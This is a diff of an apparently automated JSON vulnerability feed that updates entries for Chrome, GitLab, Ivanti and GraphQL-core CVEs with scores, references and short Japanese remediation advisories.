@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-10-30T22:58:56.692254+00:00",
+  "generated_at": "2026-10-31T02:24:15.834484+00:00",
   "items": [
     {
       "id": "CVE-2026-109618",
@@ -1052,6 +1052,106 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-119261",
+      "aliases": [],
+      "title": "",
+      "description": "Improper input validation in Skia in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:44.797",
+      "updated": "2026-10-31T00:37:15.097",
+      "cvss": 9.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/574213633"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00213,
+      "epss_percentile": 0.11601,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 74.2,
+      "level": "critical",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 19.2,
+        "unauth_network": 5,
+        "rce": 5,
+        "tier1_critical": 15,
+        "epss": 0.0
+      },
+      "ai_analysis": "【状況】Chrome の描画部品 Skia に入力の検証漏れがあります（CVE-2026-119261、CVSS 9.6、Chromium の評価は High）。細工された HTML ページを開くだけで、サンドボックスの外で任意のコードが実行されるおそれがあります。Google が 2026/10/29 に修正版を出しました。悪用は確認されていません（KEV 未掲載、EPSS 0.21%）。\n\n【原因の部品】Skia（Google が開発する 2D 描画ライブラリで、Chromium に同梱）。Edge や Electron アプリなどの Chromium 系製品、Skia を単体で使う製品（Android、Flutter など）に影響するかは未確認です。\n\n【影響範囲】\n・デスクトップ版 Chrome 156.0.8078.79 より前\n・修正版：Win/Mac は 156.0.8078.79/.80、Linux は 156.0.8078.79（Stable・Extended Stable）\n・Edge：この CVE の修正版は未確認\n・Android/iOS 版 Chrome、ChromeOS：未確認\n\n【対応策】\n1. Chrome を 156.0.8078.79 以降に更新し、再起動するよう周知してください。自動更新は再起動するまで反映されません。管理コンソールや資産管理ツールで古い版の端末を洗い出してください。\n2. 公式の回避策はありません。更新が終わるまでは、不審なリンクやサイトを開かないよう注意喚起してください。Edge などの Chromium 系ブラウザや Electron アプリは、各ベンダーの告知を確認してください。\n\n【各告知の関係】\n・Google Chrome チーム：元の部品の修正（Chrome Releases。バグ 574213633 は非公開）\n・Microsoft などの組み込み製品：対応する更新は未確認\n・公的機関の注意喚起：未確認\n\n【出典】\nhttps://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html\nhttps://www.cve.org/CVERecord?id=CVE-2026-119261"
+    },
+    {
+      "id": "CVE-2026-119263",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in GarbageCollection in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.047",
+      "updated": "2026-10-31T00:34:57.400",
+      "cvss": 9.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/575143870"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09689,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 74.2,
+      "level": "critical",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 19.2,
+        "unauth_network": 5,
+        "rce": 5,
+        "tier1_critical": 15,
+        "epss": 0.0
+      },
+      "ai_analysis": "【状況】Google Chrome のガベージコレクション（GarbageCollection）にメモリ破損の脆弱性があります（CVE-2026-119263、Chromium の深刻度 High、CVSS 9.6）。細工した HTML ページを開くだけで、サンドボックスの外で任意のコードが実行される恐れがあります。悪用は確認されていません（CISA KEV 未掲載、EPSS 0.2%）。不具合の詳細ページは非公開です。\n\n【原因の部品】Chromium の GarbageCollection（開発元 Google）。\nChromium を組み込んだ製品（Microsoft Edge、その他の Chromium 系ブラウザ、Electron アプリ、Android WebView など）への影響と修正版の有無は未確認です。\n\n【影響範囲】\n・Chrome 156.0.8078.79 より前のバージョン\n・修正版（Stable / Extended Stable）：Windows・Mac は 156.0.8078.79/.80、Linux は 156.0.8078.79\n・Android 版：同じ日に 156.0.8078.79 が出たと報じられていますが、Google の告知では確かめられていないため、この CVE が直っているかは未確認\n・Edge など組み込み製品：未確認\n\n【対応策】\n1. 社内の Chrome をすべて 156.0.8078.79 以上に更新します。更新は再起動するまで反映されないため、管理ポリシーで再起動を促すか強制してください。そのあと資産管理ツールでバージョンを確認します。\n2. 公式の回避策は出ていません。更新が終わるまでは、信頼できないサイトの閲覧を控えるよう周知してください。Edge などの Chromium 系製品も、各ベンダーが Chromium 156.0.8078.79 相当の修正を出していないか確認してください。\n\n【各告知の関係】\n・Google Chrome Releases：元の部品の修正（Chrome 156.0.8078.79/.80 の配布）\n・Chromium の不具合ページ 575143870：Google が管理する元の記録（非公開）\n・組み込み製品のベンダーの告知：未確認（今回の参照先には含まれていません）\n\n【出典】\nhttps://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html\nhttps://issues.chromium.org/issues/575143870"
+    },
+    {
       "id": "CVE-2026-96951",
       "aliases": [],
       "title": "Microsoft Windows Command Injection Vulnerability",
@@ -1411,65 +1511,12 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-111357",
-      "aliases": [],
-      "title": "Ivanti Connect Secure Missing Authentication for Critical Function Vulnerability",
-      "description": "Ivanti Connect Secure 22.8R2.4 mishandles the manner in which the dsinvoked broker trusts DSCache configuration data, leading to privilege escalation to root, as exploited in the wild in October 2026.",
-      "published": "2026-10-15T21:17:13.190",
-      "updated": "2026-10-30T20:29:25.850",
-      "cvss": 7.0,
-      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [
-        "ivanti:connect_secure"
-      ],
-      "packages": [],
-      "vendor_products": [
-        "Ivanti Connect Secure"
-      ],
-      "references": [
-        "https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935",
-        "https://www.volexity.com/blog/2026/10/13/a-series-of-unauthenticated-events-chained-exploitation-of-ivanti-connect-secure-zero-days/",
-        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-111357",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-111357"
-      ],
-      "exploit_ref": false,
-      "kev": true,
-      "kev_date_added": "2026-10-30",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00316,
-      "epss_percentile": 0.24569,
-      "x_mentions": null,
-      "sources": [
-        "nvd",
-        "kev"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "ivanti"
-      ],
-      "match_type": "exact",
-      "tier": 1,
-      "score": 64.0,
-      "level": "high",
-      "score_breakdown": {
-        "popularity": 30,
-        "cvss": 14.0,
-        "kev": 20,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-97229",
       "aliases": [],
       "title": "GitLab Community Edition and Enterprise Edition Integer Overflow or Wraparound Vulnerability",
       "description": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 19.2 before 19.2.8, 19.3 before 19.3.5, and 19.4 before 19.4.2 that, under certain conditions, could have allowed an unauthenticated user to execute arbitrary code on the GitLab server via a specially crafted regular expression in a CI/CD configuration, due to insufficient regular expression validation.",
       "published": "2026-10-13T02:17:00.840",
-      "updated": "2026-10-30T10:36:26.950",
+      "updated": "2026-10-31T00:16:52.007",
       "cvss": 10.0,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
       "severity": "critical",
@@ -1485,6 +1532,8 @@
         "https://gitlab.com/gitlab-org/gitlab/-/work_items/630686",
         "https://hackerone.com/reports/4055749",
         "https://hackerone.com/reports/4058589",
+        "https://github.com/rapid7/metasploit-framework/pull/22017",
+        "https://www.ruby-lang.org/en/news/2026/10/23/regexp-fixes-for-gitlab-cves/",
         "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-97229",
         "https://nvd.nist.gov/vuln/detail/CVE-2026-97229"
       ],
@@ -1493,8 +1542,8 @@
       "kev_date_added": "2026-10-29",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": 0.18427,
-      "epss_percentile": 0.97229,
+      "epss": 0.26569,
+      "epss_percentile": 0.98015,
       "x_mentions": null,
       "sources": [
         "nvd",
@@ -1506,7 +1555,7 @@
       "matched": [],
       "match_type": "kev-only",
       "tier": null,
-      "score": 62.8,
+      "score": 64.0,
       "level": "high",
       "score_breakdown": {
         "popularity": 10,
@@ -1514,7 +1563,7 @@
         "unauth_network": 5,
         "rce": 5,
         "kev": 20,
-        "epss": 2.8
+        "epss": 4.0
       },
       "ai_analysis": ""
     },
@@ -5099,6 +5148,447 @@
       "ssvc_exploitation": "",
       "epss": 0.00242,
       "epss_percentile": 0.15469,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119260",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Frames in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:44.663",
+      "updated": "2026-10-31T00:37:55.637",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/573264074"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09689,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119262",
+      "aliases": [],
+      "title": "",
+      "description": "Improper input validation in V8 in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:44.920",
+      "updated": "2026-10-31T00:35:30.147",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/574660146"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00236,
+      "epss_percentile": 0.14663,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119264",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in Dawn in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.177",
+      "updated": "2026-10-31T00:34:11.967",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/575150692"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09664,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119265",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in Quota in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.303",
+      "updated": "2026-10-31T00:33:40.180",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/575201795"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09663,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119266",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Quota in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.430",
+      "updated": "2026-10-31T00:33:26.740",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/575202553"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09663,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119267",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in DOM in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.553",
+      "updated": "2026-10-31T00:32:25.687",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/576203565"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09664,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119268",
+      "aliases": [],
+      "title": "",
+      "description": "Integer overflow in Editing in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.680",
+      "updated": "2026-10-31T00:31:23.740",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/576984708"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09663,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119269",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Blink in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.807",
+      "updated": "2026-10-31T00:30:16.150",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/577072000"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00198,
+      "epss_percentile": 0.09664,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.6,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119270",
+      "aliases": [],
+      "title": "",
+      "description": "Improper input validation in CacheStorage in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-30T01:16:45.937",
+      "updated": "2026-10-31T00:29:53.310",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
+        "https://issues.chromium.org/issues/577333729"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00212,
+      "epss_percentile": 0.11575,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -10510,100 +11000,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-119261",
-      "aliases": [],
-      "title": "",
-      "description": "Improper input validation in Skia in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:44.797",
-      "updated": "2026-10-30T14:16:42.120",
-      "cvss": 9.6,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
-      "severity": "critical",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/574213633"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00213,
-      "epss_percentile": 0.11601,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 50.2,
-      "level": "high",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 19.2,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119263",
-      "aliases": [],
-      "title": "",
-      "description": "Memory corruption in GarbageCollection in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.047",
-      "updated": "2026-10-30T14:16:42.547",
-      "cvss": 9.6,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
-      "severity": "critical",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/575143870"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09689,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 50.2,
-      "level": "high",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 19.2,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-103558",
       "aliases": [],
       "title": "",
@@ -11134,6 +11530,52 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-111357",
+      "aliases": [],
+      "title": "Ivanti Connect Secure Missing Authentication for Critical Function Vulnerability",
+      "description": "Ivanti Connect Secure contains a missing authentication for critical function vulnerability that could allow a local authenticated attacker to escalate their privileges. This vulnerability can be chained with CVE-2026-104935 and CVE-2026-118527.",
+      "published": "2026-10-30",
+      "updated": "2026-10-30",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Ivanti Connect Secure"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111357"
+      ],
+      "exploit_ref": false,
+      "kev": true,
+      "kev_date_added": "2026-10-30",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00316,
+      "epss_percentile": 0.24569,
+      "x_mentions": null,
+      "sources": [
+        "kev"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "ivanti"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 50.0,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "kev": 20,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-15323",
       "aliases": [],
       "title": "Product Designer for WooCommerce WordPress | Lumise <= 2.1.2 - Unauthenticated Arbitrary File Read via 'design.stages[*].image' Parameter in Cart JSON Upload",
@@ -11217,57 +11659,6 @@
       "first_seen": "2026-10-29T15:34:30.523090+00:00",
       "matched": [
         "wordpress"
-      ],
-      "match_type": "exact",
-      "tier": 1,
-      "score": 50.0,
-      "level": "high",
-      "score_breakdown": {
-        "popularity": 30,
-        "cvss": 15.0,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119286",
-      "aliases": [],
-      "title": "GraphQL-core: Denial of service via memory leak in aborted validations",
-      "description": "GraphQL-core is a Python port of the GraphQL.js reference implementation. From 3.3.0a3 until 3.3.1, validate() reuses a module-level ValidationAbortedError when a document exceeds max_errors. Python appends frames to the reused exception's traceback on every raise, retaining each document, validation context, and error set for the process lifetime. An unauthenticated client can repeatedly submit a small document with more than 100 validation errors to cause unbounded memory growth before query execution, eventually exhausting worker memory without disclosing or modifying data. This issue is fixed in version 3.3.1.",
-      "published": "2026-10-29T21:38:43.633Z",
-      "updated": "2026-10-29T22:17:01.517",
-      "cvss": 7.5,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "graphql-python graphql-core"
-      ],
-      "references": [
-        "https://github.com/graphql-python/graphql-core/security/advisories/GHSA-mpqx-q82w-9x46",
-        "https://github.com/graphql-python/graphql-core/issues/287",
-        "https://github.com/graphql-python/graphql-core/pull/288",
-        "https://github.com/graphql-python/graphql-core/commit/3c319fd9f4b8f6c9db4189520561bf8dd0e70be9",
-        "https://github.com/graphql-python/graphql-core/releases/tag/v3.3.1"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T00:25:22.530345+00:00",
-      "matched": [
-        "python"
       ],
       "match_type": "exact",
       "tier": 1,
@@ -11778,429 +12169,6 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "2026-10-28T00:02:40.554138+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
